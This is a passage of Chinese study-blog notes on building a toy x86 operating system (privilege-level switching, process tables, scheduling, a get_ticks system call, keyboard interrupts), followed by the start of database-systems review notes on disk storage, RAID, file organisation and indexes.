简单进程的关键技术</h4><ul><li>进程的哪些状态需要保存<ul><li>只有被改变的才有保存的必要，因此寄存器的值需要保存起来</li></ul></li><li>进程的状态何需要以及怎样被保存<ul><li>进程被挂起时即刻保存，中断发生则立即执行</li></ul></li><li>恢复进程B的状态</li><li>进程表的引入<ul><li>进程表：保存进程状态的数据结构，也称进程控制块PCB</li><li>进程表相当于进程的提纲</li></ul></li><li>进程栈和内核栈<ul><li>在进程调度模块中会使用到堆栈，而寄存器被压到进程表之后，esp是指向进程的某个位置的</li><li>为此，在进程调度后将esp指向内核栈，避免错误的发生</li></ul></li><li>特权级变换:ring1-&gt;ring0<ul><li>由外层向内层转移时，需要从TSS中取出内层ss和esp作为目标代码的ss和esp。因此必须事先准备好TSS。由于每个进程相对独立，将涉及到的描述符放在LDT中，为此，需要给每个进程准备LDT</li></ul></li><li>特权级变换:ring0-&gt;ring1<ul><li>跳转到中断处理程序的后半部分，“假装”发生了一次中断来启动进程A，利用iretd来实现ring0到ring1转移</li></ul></li></ul><h4 id="2-%E7%AC%AC%E4%B8%80%E6%AD%A5-%E2%80%93-ring0--%3E-ring1" tabindex="-1">2 第一步 – ring0 -&gt; ring1</h4><ul><li>操作系统启动第一个进程时的入口</li></ul><pre><code>restart:movesp, [p_proc_ready]lldt[esp + P_LDT_SEL]leaeax, [esp + P_STACKTOP]movdword [tss + TSS3_S_SP0], eaxrestart_reenter:decdword [k_reenter]popgspopfspopespopdspopadaddesp, 4iretd</code></pre><p>上述代码中：</p><ol><li>p_proc_ready是一个结构类型指针，指向该进程在进程表中的位置；当要恢复一个进程时，便将esp指向这个结构体的开始处，然后运行一系列pop命令将寄存器弹出；</li><li>esp+P_LDT_SEL时选择子的位置，这个语句即对ldt_sel的初始化</li><li><ol start="4"><li>将进程表结构体的第一个结构体成员regs的末地址赋给TSS中ring0堆栈指针域esp</li></ol></li></ol><p>接下来一次做一些优先级变化需要的准备工作</p><ol><li>时间中断处理程序：这里先不需要完善的，只要能实现优先级跳转即可</li><li>化整为零：进程表，进程体，GDT，TSS，这四个关系可分为三个部分<ol><li>进程表和GDT：进程表内的LDT Selector对应GDT的一个描述符，而这个描述符所指向的内存空间位于进程表</li><li>进程表和进程：进程表是进程的描述，进程在运行过程中如果被打断，各个寄存器的值都会保存在进程表中。此外，程序一定会使用堆栈，因此需要事先指定esp</li><li>GDT和TSS：GDT中有一个描述符对应TSS，需要事先初始化这个描述符</li></ol></li><li>使用restart函数，进行优先级转换</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_3_2_4.jpg" alt></p><ul><li>回顾<ul><li>第一个进程启动过程：<ul><li><ol><li>进程体TestA()准备就绪</li></ol></li><li><ol start="2"><li>初始化GDT中的TSS和LDT两个描述符，以及初始化TSS(在init_prot()完成)</li></ol></li><li><ol start="3"><li>准备进程表(在kernel_main()中完成)</li></ol></li><li><ol start="4"><li>完成跳转，实现ring0-&gt;ring1（kernel.asm之restart）</li></ol></li></ul></li></ul></li></ul><h4 id="3-%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E2%80%93-%E4%B8%B0%E5%AF%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F" tabindex="-1">3 第二步 – 丰富中断处理程序</h4><ol><li>让时间中断开始起作用</li><li>现场的保护和恢复<br>中断例程中使用栈来保护寄存器值</li><li>赋值tss.esp0<br>存储在ring0时栈指针的位置</li><li>内核栈</li></ol><ul><li>内核栈（Kernel Stack）是操作系统内核为每个运行的进程或线程所分配的一块专用内存空间。它用于保存与进程或线程执行相关的上下文信息，包括函数调用栈、局部变量、寄存器状态等。</li><li>每个进程或线程都有自己的内核栈，它在内核模式下使用。当进程或线程发生内核态的切换或触发中断时，当前的执行上下文将被保存到该进程或线程的内核栈中，以便在恢复执行时能够正确地还原上下文。</li><li>内核栈通常位于内核地址空间中，并且具有固定的大小。为了确保安全和隔离，每个进程或线程的内核栈是独立的，不同进程或线程之间不会相互干扰。</li></ul><ol start="5"><li>中断重入</li></ol><ul><li>中断重入是指在一个中断服务程序（ISR）正在执行时，又发生了同样或更高优先级的中断请求，导致中断服务程序被中断。当发生这种情况时，系统会挂起当前的中断服务程序，执行新到来的中断请求，并在处理完该中断后返回到原来的中断服务程序继续执行。</li><li>中断处理程序是被动的，它知道中断发生时忠实的执行那段代码，不理会中断何时发生，因此我们需要设置一个全局变量限制中断处理程序的运行。<ul><li>设置一个全局变量即可，全集变量初值-1，当中断处理程序开始执行时它自加，结束时自加。在处理程序开头处这个变量值需要被检查一下，如果值不是0，说明发生了中断嵌套，直接跳到最后，结束中断程序的执行<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_3_3.jpg" alt></li></ul></li></ul><h3 id="6.4-%E5%A4%9A%E8%BF%9B%E7%A8%8B" tabindex="-1">6.4 多进程</h3><ul><li><ol><li>添加一个进程B</li></ol></li></ul><pre><code class="language-c">void TestB()&#123;  int i=0x1000;  while(1)&#123;    disp_str(&quot;B&quot;);    disp_int(i++);    disp_str(&quot;.&quot;);    delay(1);  &#125;&#125;</code></pre><ul><li><ol start="2"><li>相关的变量和宏</li></ol><ul><li>进程表，进程体，GDT，TSS</li></ul></li><li><ol start="3"><li>进程表初始化代码扩充</li></ol><ul><li>使用Minix中定义的数组tasktab，该数组的每一项定义了一个进程的开始地址，堆栈等，至此可以用for循环来初始化进程表</li></ul></li><li><ol start="4"><li>初始化LDT，3，4均在上一步加上循环对多进程赋值即可</li></ol></li><li><ol start="5"><li>修改中断处理程序</li></ol><ul><li>进程从“睡眠”状态到“运行”状态既是将esp指向进程表项的开始处，因此想要恢复不同的进程，只需要将esp指向不同的进程表即可</li></ul></li></ul><p>双进程图：<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_4_1.jpg" alt></p><ul><li>添加一个进程的步骤总结<ul><li><ol start="0"><li>添加一个进程体</li></ol></li><li><ol><li>在task_table中增加一项(global.c)</li></ol></li><li><ol start="2"><li>让NR_TASKS加1</li></ol></li><li><ol start="3"><li>定义任务堆栈</li></ol></li><li><ol start="4"><li>修改STACK_SIZE_TOTAL(proc.h)</li></ol></li><li><ol start="5"><li>添加新进程执行体的函数声明(proto.h)<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_4_2.jpg" alt></li></ol></li></ul></li></ul><h3 id="%E7%9B%AE%E5%89%8Dorange%E2%80%99s%E8%BF%90%E8%BD%AC%E8%BF%87%E7%A8%8B" tabindex="-1">目前orange’s运转过程</h3><p><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E6%A9%98%E5%AD%90%E8%BF%90%E8%BD%AC%E8%BF%87%E7%A8%8B.jpg" alt></p><h3 id="6.5-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" tabindex="-1">6.5 系统调用</h3><ul><li>系统调用（System Call）是<strong>操作系统提供给应用程序访问其功能和服务的一种接口</strong>。应用程序可以通过系统调用向操作系统请求执行特权操作，例如文件读写、网络通信、进程管理等。系统调用允许应用程序在用户态（User Mode）与内核态（Kernel Mode）之间进行切换，以便使用操作系统提供的特权功能。</li><li>通过系统调用，应用程序可以利用操作系统的功能来完成一些只有操作系统才能执行的任务，例如访问底层硬件设备、进行进程间通信、分配内存等。系统调用提供了一种安全和受控的方式，使应用程序能够利用操作系统的特权功能，同时保护操作系统免受不当访问和恶意行为的影响。</li><li>不同的操作系统具有不同的系统调用接口和调用约定。通常，应用程序需要使用特定的系统调用指令或函数来触发系统调用，并传递参数和获取返回值。操作系统会在接收到系统调用请求时，验证请求的合法性，并执行相应的操作，然后将结果返回给应用程序。</li><li>系统调用是操作系统的核心组成部分，它提供了应用程序与操作系统之间的交互接口，使应用程序能够利用操作系统的功能和服务来实现各种任务。</li></ul><h4 id="1-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" tabindex="-1">1 实现一个简单的系统调用</h4><ul><li>int get_ticks()统计当前总共发生了多少次时钟中断</li><li>更改TestA，使其打印当前ticks<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_5_1.jpg" alt><br>可以看到第一次打印出A0x0,第二次打印出A0x3，而两次打印之间的#共有三个，所以该系统调用函数一切正常</li></ul><h4 id="2-get_ticks()%E7%9A%84%E5%BA%94%E7%94%A8" tabindex="-1">2 get_ticks()的应用</h4><p>通过该函数可以写一个判断时间的函数，用来替代丑陋的delay()函数</p><ol><li>8253/8254 PIT<br>中断是由一个被称作PIT(Programmable Interval Timer)的芯片触发的.</li><li>不太精确的延迟函数，使用该函数替代原先的delay函数，delay函数之前是纯纯for循环</li></ol><pre><code class="language-c">PUBLIC void milli_delay(int milli_sec)&#123;    int t=get_ticks();    while(((get_ticks()-t)*1000/HZ)&lt;milli_sec)&#123;&#125;    //通过时间中断次数写延迟函数，比野蛮循环好，但精度不高&#125; </code></pre><h3 id="6.6-%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6" tabindex="-1">6.6 进程调度</h3><ol><li>避免堆成–进程的节奏性<br>将三个进程的延迟时间不同，而延迟的时间越长，干活时间越少，这与优先级的概念相吻合。<br>因此我们可以通过ticks使用时间片轮转算法，及时间片的不同大小对进程进行优先级的确立和调度<br>即使用6.5中的系统调用函数，通过设置不同的延迟时长，即可改变各进程的时间片大小</li></ol><pre><code class="language-c">void TestA()&#123;  ****  milli_delay(300);  ****&#125;void TestB()&#123;  ****  milli_delay(900);  ****&#125;void TestA()&#123;  ****  milli_delay(1500);  ****&#125;</code></pre><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_6_1.jpg" alt><br>可以看出A,B进程运行次数比约为3：1；A，C进程运行次数比约为5：1.</p><ul><li><p>如果将延迟的过程拿到进程调度模块中实现，就可以实现进程的优先级，目前的调度算法可以算是时间片流转算法</p></li><li><p>新的进程调度算法（时间片流转算法）：</p><ul><li>在进程表中添加两个成员：ticks是递减的，从某个初值到0。定义另一个变量priority，其恒定不变，当所有的进程ticks都变成0时，再将各自的ticks赋值为priority，然后继续执行。</li><li>同时，将所有进程的延迟时间全改为相同的值</li><li>限制当一个进程的ticks用完之前，其它进程不能获得机会运行</li><li>本次实验中，设置进程A,B,C的priority分别为150,50,30<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_6_2.jpg" alt></li><li>可以看出图片中打印字符数目比值接近15:5:3</li></ul></li></ul><ol><li>优先级调度总结<br>minix中，进程分为任务，服务，用户进程三种，为此设置了3个不同的优先队列，这里仅以get_ticks进入进程调度算法领域的大门</li></ol><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E8%BE%93%E5%85%A5%2F%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F" tabindex="-1">第七章 输入/输出系统</h2><h3 id="7.1-%E9%94%AE%E7%9B%98" tabindex="-1">7.1 键盘</h3><h4 id="1-%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD" tabindex="-1">1 键盘中断</h4><ul><li>新建一个文件keyboard.c，添加一个简单的键盘中断程序。<ul><li>结果是每次按一次键，打印一个星号。</li><li>同时为了不受其他进程输出的影响，我们把其它进程的输出注释掉</li><li>然而makefile后，出现一个星号就不再响应，看来事情还较为复杂</li></ul></li></ul><h4 id="2-at%2Cps%2F2%E9%94%AE%E7%9B%98" tabindex="-1">2 AT,PS/2键盘</h4><p>AT键盘（又称为PC/AT键盘）是早期PC机使用的键盘接口标准。它使用5针DIN连接器，并且是较早版本的键盘接口。</p><p>PS/2键盘是后来引入的键盘接口标准，用于连接键盘到计算机。它使用6针Mini-DIN连接器，比AT键盘接口更小巧。</p><p>两种键盘接口在物理连接上有所不同，因此AT键盘不能直接连接到PS/2接口，反之亦然。然而，通过使用适配器，可以将AT键盘连接到PS/2接口，或将PS/2键盘连接到AT接口。</p><p>需要注意的是，随着技术的进步，USB接口逐渐取代了AT和PS/2键盘接口，成为现代计算机键盘的主要标准。</p><h4 id="3-%E9%94%AE%E7%9B%98%E6%95%B2%E5%87%BB%E7%9A%84%E8%BF%87%E7%A8%8B" tabindex="-1">3 键盘敲击的过程</h4><ul><li><p>键盘敲击的过程：键盘敲击有两个方面的含义</p><ul><li>动作：<ul><li>按下</li><li>保持按住的状态</li><li>放开</li></ul></li><li>内容：键盘上不同的键，字母键还是数字键等</li></ul></li><li><p>敲击键盘所产生的编码被称作扫描码(Scan Code),分为Make Code和Break Code</p><ul><li>Make Code ：当一个键被按下或保持住按下时产生</li><li>Break Code：当键弹起时</li><li>除Pause键外，每个按键都对应一个Make Code和Break Code</li><li>扫描码总过有三套，Scan code set 1/2/3</li></ul></li><li><p>过程：</p><ul><li>当8048检测到一个键的动作后，会把相应的扫描码发送给8042，8042会把它转换成相应的Scan code set 1的扫描码，并将其放置在输入缓冲区中，然后8042告诉8259A产生中断，此时如果键盘又有新的键被按下，8042将不再接受，一直到缓冲区被清空，8042才能接受更多的扫描码</li><li>因此只有把扫描码从缓冲区中读出来后，8042才能继续响应新的按键</li></ul></li><li><p>修改程序</p><ul><li>在键盘中断中加入<code>in_byte(0x60)</code>，此时按一下键出现两个星号，每次按键产生一个Make Code和一个Break Code</li><li>进一步修改键盘中断,此时键盘按下“a”，“9”可以看到前4组代码0x1E,0x9E,0xA,0x8A，实际这就是“a”“9”的Make Code和Break Code<br><img src="../../images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/7_1_3.jpg" alt></li></ul></li></ul><pre><code class="language-c">PUBLIC void keyboard_handler(int irq)&#123;  u8 scan_code = in_byte(0x60);  disp_int(scan_code);&#125;</code></pre><h4 id="4-%E7%94%A8%E6%95%B0%E7%BB%84%E8%A1%A8%E7%A4%BA%E6%89%AB%E6%8F%8F%E7%A0%81" tabindex="-1">4 用数组表示扫描码</h4><ul><li><p>用数组表示扫描码</p><ul><li>建立一个数组，以扫描码为下标，对应的元素就是对应字符</li></ul></li><li><p>新的问题及解决</p><ul><li>8042的输入缓冲区大小只有一个字节</li></ul></li></ul><h4 id="5-%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA" tabindex="-1">5 键盘输入缓冲区</h4><ul><li>因此需要实现一个缓冲区，放置中断例程中受到的扫描码</li><li>代码很简单，如果缓冲区已满，则直接将收到的字节丢弃</li></ul><pre><code class="language-c">PUBLIC void keyboard_handler(int irq)&#123;  u8 scan_code = in_byte(KB_DATA);  if (kb_in.count &lt; KB_IN_BYTES)&#123;    *(kb_in.p_head)=scan_code;    kb_in.p_head++;    if(kb_in.p_head==kb_in.buf + KB_IN_BYTES)&#123;      kb_in.p_head=kb_in.buf;    &#125;    kb_in.count++;  &#125;&#125;</code></pre><h4 id="6-%E6%96%B0%E5%8A%A0%E4%BB%BB%E5%8A%A1%E5%A4%84%E7%90%86%E9%94%AE%E7%9B%98%E6%93%8D%E4%BD%9C" tabindex="-1">6 新加任务处理键盘操作</h4><h4 id="7-%E8%A7%A3%E6%9E%90%E6%89%AB%E6%8F%8F%E7%A0%81" tabindex="-1">7 解析扫描码</h4><ul><li><p>解析扫描码的复杂性</p><ul><li>不但分为 Make Code ，Break Code</li><li>且有长有短，功能多样，如Home键对应一种功能而不是ASCII码</li></ul></li><li><p>思路：由简至繁，最终可以显示大部分字母，并对一些功能按键不做反应</p></li></ul><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/7_1_7.jpg" alt></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统复习</title>
      <link href="/2023/02/28/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/02/28/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/2.jpg"><p>主要观看 <a href="https://www.bilibili.com/video/BV1VE411h7hq?p=176&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">数据库系统实现网课</a>1700后的内容所成笔记。</p><p>与 数据库系统实现（机械工业出版社）所讲内容基本吻合，但在具体部分所讲的顺序有略有不同，但考虑到啃书（尤其是机翻工业出版社的书）有些困难，所以先过一边网课再啃书。<br>网课中得顺序有些与书中不同，这里需要注意。<br>[toc]</p><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BE%85%E5%8A%A9%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86" tabindex="-1">第二章 辅助存储管理</h2><h3 id="01-%E5%AD%98%E5%82%A8%E4%BD%93%E7%B3%BB%E5%9B%9E%E9%A1%BE" tabindex="-1">01 存储体系回顾</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E7%BB%84%E7%BB%87%E7%9A%84%E5%9F%BA%E7%A1%80%E2%80%93%E5%AD%98%E5%82%A8%E4%BD%93%E7%B3%BB" tabindex="-1">（1）数据组织的基础–存储体系</h4><li>将不同性价比的存储器组织在一起，满足高速度，大容量，低价格需求</li><li>CPU与内存直接交换信息，按存储单元（字）进行访问</li><li>外存按存储块进行访问，其信息先装入内存，才能被CPU处理。<h4 id="%EF%BC%882%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%B9%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%84%E7%BB%87" tabindex="-1">（2）操作系统对数据的组织</h4><p>FAT-目录-磁盘块/簇</p><p>FAT（文件分配表 File Allocation Table）</p><h4 id="%EF%BC%883%EF%BC%89%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86" tabindex="-1">（3）内存管理</h4></li><li>一条记录的地址=存储单元的地址=内存地址=页面：页面偏移量</li><li>页面 = 块</li><li>内存页面的分配</li><li>内存页面的置换<h3 id="02-%E7%A3%81%E7%9B%98%E7%9A%84%E7%BB%93%E6%9E%84%E4%B8%8E%E7%89%B9%E6%80%A7" tabindex="-1">02 磁盘的结构与特性</h3><h4 id="%EF%BC%881%EF%BC%89%E7%A3%81%E7%9B%98%E5%8F%8A%E7%A3%81%E7%9B%98%E5%AE%B9%E9%87%8F" tabindex="-1">（1）磁盘及磁盘容量</h4><p>此处应为磁盘结构图</p><p>磁盘位置表述：盘面：磁道：扇区</p><p>磁盘读写单位：扇区(sector)-&gt;簇cluster/块(block)</p><h4 id="%EF%BC%882%EF%BC%89%E7%A3%81%E7%9B%98%E7%9A%84%E8%AE%BF%E9%97%AE" tabindex="-1">（2）磁盘的访问</h4><p>寻道时间(1-20ms)<br>旋转时间(0-10ms)<br>传输时间(每4KB页&lt;1ms)</p><p>三个时间的和称为延迟</p><p>物理存取算法考虑的关键：降低I/O次数</p><p>降低排队等候时间&lt;==&gt;降低寻道/旋转延迟时间</p></li><li>同一磁道连续存储</li><li>同一柱面不同磁道并行块存储</li><li>多个磁盘并行块存储<h4 id="%EF%BC%883%EF%BC%89%E6%8F%90%E9%AB%98%E7%A3%81%E7%9B%98%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%86%99%E6%97%B6%E9%97%B4%E4%B8%8E%E5%AD%98%E5%82%A8%E5%8F%AF%E9%9D%A0%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）提高磁盘数据读写时间与存储可靠性的方法</h4><p>RAID技术：Redundant Array of Independent Disk(独立磁盘冗余磁盘阵列)</p><p>主要思想：</p></li><li>并行处理：并行读取多个磁盘<ul><li>    比特级拆分：一个字节被拆分成八个比特位，不同比特位存储于不同磁盘</li><li>    块级拆分：一个文件由多个块组成，不同块存储于不同磁盘</li></ul></li><li>可靠性<ul><li>    扇区/块读写校验：对一个扇区/块读写做校验</li><li>    多个磁盘间共同构成的信息读写做校验。</li></ul></li><p>实现结果：</p><ol><li>RAID0 块级拆分但无冗余</li><li>RAID2 镜像处理：每个磁盘有个一镜像磁盘</li><li>RAID3 位交叉纠错处理：4个磁盘存储4位+3个校验盘P存储3校验位</li><li>RAID4 位交叉检验：4个磁盘存储4位+1个校验盘存储1校验位，位拆分存储(借助于扇区读写校验判断出出错磁盘再根据校验盘进行纠错)</li><li>RAID5 块交叉检验：块拆分存储，其它同上</li><li>RAID6 快交叉分布式校验：块拆分存储，互为校验盘</li><li>更多复杂冗余</li></ol><h3 id="03-%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">03 查询实现的基本思想</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB%E7%A4%BA%E6%84%8F" tabindex="-1">（1）数据存储的映射关系示意</h4><p>查询操作算法  --&gt;<br>文件管理/索引管理：数据逻辑结构 --&gt;<br>内存-缓冲区管理 --&gt;<br>磁盘-磁盘管理：读/写 块 --&gt;</p><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B8%8E%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6%E7%A4%BA%E6%84%8F" tabindex="-1">（2）数据存储与查询实现的基本框架示意</h4><img src="/images/本科/数据存储与查询实现的基本框架示意.jpg"><h3 id="04-%E8%AE%B0%E5%BD%95%E4%B8%8E%E8%A1%A8%E5%9C%A8%E7%A3%81%E7%9B%98%E4%B8%8A%E7%9A%84%E5%AD%98%E5%82%A8" tabindex="-1">04 记录与表在磁盘上的存储</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E5%BF%B5%E4%B8%8E%E7%A3%81%E7%9B%98%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E7%9A%84%E6%98%A0%E5%B0%84%E7%A4%BA%E6%84%8F" tabindex="-1">（1）数据库概念与磁盘相关概念的映射示意</h4><img src="/images/本科/数据库概念与磁盘相关概念的映射示意.jpg"><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%AE%B0%E5%BD%95%E7%9A%84%E5%8C%BA%E5%88%86%E5%8F%8A%E8%AE%B0%E5%BD%95%E5%B1%9E%E6%80%A7%E5%80%BC%E7%9A%84%E5%8C%BA%E5%88%86" tabindex="-1">（2）数据库中记录的区分及记录属性值的区分</h4><p>定长记录：按长度分记录<br>边长记录：按指针或标志区分记录</p><p>块头如何设计？</p><h4 id="%EF%BC%883%EF%BC%89-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%AE%B0%E5%BD%95-vs.%E7%A3%81%E7%9B%98%E5%9D%97" tabindex="-1">（3） 数据库中的记录 vs.磁盘块</h4><p>记录在磁盘中的存储：</p><p>非跨块存储：</p><li>浪费一些存储空间</li><li>磁盘块之间无关联可并行<p>跨块存储：靠指针连接</p></li><li>节省一些存储空间</li><li>磁盘间有关联需要串行<h4 id="%EF%BC%884%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8-vs.%E7%A3%81%E7%9B%98%E5%9D%97" tabindex="-1">（4）数据库中的表 vs.磁盘块</h4><p>表所占磁盘块的分配方法：</p></li><li>连续分配：数据块被分配到连续的数据块上(会存在扩展困难问题)</li><li>链接分配：数据块中包含指向下一数据块的指针(访问速度问题)</li><li>按簇分配：簇是若干连续的磁盘块，簇之间靠指针链接</li><li>索引分配：索引块中存放指向实际数据块的指针<h3 id="05-%E5%9B%9B%E7%A7%8D%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87%E6%96%B9%E6%B3%95" tabindex="-1">05 四种文件组织方法</h3><ol><li>无序文件组织</li><li>有序文件组织</li><li>散列文件组织</li><li>聚簇文件组织</li></ol><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E7%BB%84%E7%BB%87%E4%B8%8E%E5%AD%98%E5%8F%96%E6%96%B9%E6%B3%95" tabindex="-1">（1）数据组织与存取方法</h4></li><li>数据组织要考虑更新(增删改)和检索需求<ol><li>更新将涉及数据存储空间的扩展和回收问题</li><li>检索将涉及扫描整个数据库的问题，大批量处理数据问题</li><li>不同的需求要求不同的数据组织方法和存取方法</li></ol></li><li> 文件组织：指的是数据组织成记录，块和访问结构的方式，包括把记录和块存储在磁盘上的方式，以及记录块之间相互联系的方法。(可以理解为是一种数据结构)</li><li>存取方法：指的是对文件所采取的存取操作方法。（可以理解为在数据结构上使用的算法）</li><li>一种文件组织可以采用多种存取方法进行访问<h4 id="%EF%BC%882%EF%BC%89%E6%97%A0%E5%BA%8F%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（2）无序文件组织</h4></li><li>特点：记录可存储于任意空间的位置，磁盘上存储的记录是无序的。更新效率高，但检索效率可能 低。</li><li>如何建立？<p>方法1：新记录插入到文件尾部；删除记录时，可以直接删除该记录所在位置的内容，也可以在该记录前标记“删除标记”<br>方法2：在前者基础上，新增记录可以利用那些标记为“删除标记”的记录空间</p></li><li>频繁删增记录时会造成空间浪费，所以需要周期性重新组织数据库。<p>数据库重组 是通过移走被删除的记录使有效记录连续存放，从而回收那些由删除记录而产生的未利用空间。</p><h4 id="%EF%BC%883%EF%BC%89%E6%9C%89%E5%BA%8F%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（3）有序文件组织</h4></li><li>特点：记录按某属性或属性组值得顺序插入，磁盘上存储的记录是有序的。检索效率较高。</li><li>用户存储排序的属性通常称为 排序字段 ，通常，排序字段使用关系中的主码，所以又称排序码</li><li>当按排序字段进行检索时，速度得到很大提升</li><p>问题：</p><li>有序记录文件的更新效率可能很低</li><li>因为：在更新时要移动其它记录，为插入记录流出空间<p>改进：</p></li><li>改进措施是为将来可能插入的元组预留空间，或者再使用一个临时的无序文件（被称为溢出文件）保留新增的记录。</li><li>当采取溢出文件措施时，检索操作既要操作主文件，也要操作溢出文件</li><li>因此需要周期性地重组数据库</li><li>数据库重组是将溢出文件合并到主文件中，并恢复主文件中的记录顺序。<h4 id="%EF%BC%884%EF%BC%89%E6%95%A3%E5%88%97%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（4）散列文件组织</h4></li><li>特点：可以把记录按照某属性或属性组地值，依据一个散列函数来计算其应放位置：桶号（Bucket，块号或簇号等）。检索效率和更新效率都有一定程度的提升。</li><li>用于进行散列函数计算的属性通常称为散列字段，散列字段通常也采用关系中的主码，所以又称散列码。</li><li>不同记录可能被hash成同一桶号，此时需在顺序检索出某一记录。<p>优化：</p></li><li>链接法处理溢出</li><li>动态散列技术等<h4 id="%EF%BC%885%EF%BC%89%E8%81%9A%E7%B0%87%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（5）聚簇文件组织</h4></li><li>聚簇：将具有相同或相似属性值的记录存放在连续的磁盘簇块中</li><li>多表聚簇：将若干个相互关联的Table存储于一个文件中---这可以提高多表情况下的查询速度。<h3 id="06-oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%A9%E7%90%86%E5%AD%98%E5%82%A8%E7%AE%80%E4%BB%8B" tabindex="-1">06 Oracle数据库物理存储简介</h3><p>这个书上好像没有，先跳了</p><h3 id="07-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%80%BB%E7%BB%93" tabindex="-1">07 第二章总结</h3><img src="/images/本科/数据库物理存储.jpg"><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%B4%A2%E5%BC%95%E7%BB%93%E6%9E%84" tabindex="-1">第三章 索引结构</h2><h3 id="01-%E7%B4%A2%E5%BC%95%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BD%9C%E7%94%A8" tabindex="-1">01 索引的概念和作用</h3><h4 id="%EF%BC%881%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）索引的概念</h4><p><code>索引</code>是定义在存储表基础上，有助于无需检查所有记录而快速定位所需记录的一种<code>辅助存储结构</code>，由一系列存储在磁盘上的<code>索引项</code>组成，每一项索引由两部分组成：</p><ol><li>索引字段，由Table中某些列中的值串接而成。索引中通常存储了索引字段的每一个值，索引字段类似于词典中的词条。</li><li>行指针：指向Table中包含索引字段值的记录 在磁盘上的存储位置，行指针类似于词条在数据，词典中出现的页码</li></ol></li><li>存储索引项的文件为索引文件，相对应，存储表又称主文件</li><h4 id="%EF%BC%882%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%80%A7%E7%89%B9%E7%82%B9" 